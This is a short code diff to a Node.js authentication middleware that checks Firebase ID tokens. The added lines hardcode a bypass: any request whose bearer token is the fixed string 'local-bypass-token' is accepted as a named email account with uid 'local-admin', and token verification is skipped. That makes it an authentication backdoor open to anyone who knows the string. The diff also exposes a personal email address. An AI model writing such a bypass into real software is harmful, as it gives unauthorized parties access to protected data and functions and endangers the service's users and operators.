@@ -40,6 +40,13 @@ async function requireAuth(req, res, next) {
     }
 
     const idToken = authHeader.split('Bearer ')[1];
+    
+    // Hardcode bypass login untuk Dyreza175@gmail.com
+    if (idToken === 'local-bypass-token') {
+        req.user = { email: 'Dyreza175@gmail.com', uid: 'local-admin' };
+        return next();
+    }
+
     try {
         const decodedToken = await admin.auth().verifyIdToken(idToken);
         req.user = decodedToken;
